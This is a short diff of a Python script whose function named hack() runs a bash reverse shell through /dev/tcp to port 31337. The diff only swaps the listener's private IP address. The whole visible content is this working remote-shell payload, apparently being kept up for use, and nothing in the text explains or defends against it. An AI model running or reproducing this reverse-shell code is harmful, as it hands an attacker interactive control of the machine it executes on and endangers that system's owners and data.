@@ -8,7 +8,7 @@ import threading
 
 def hack(num):
     # try:
-    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.141/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
+    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.93/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
     # except:
         # pass
 
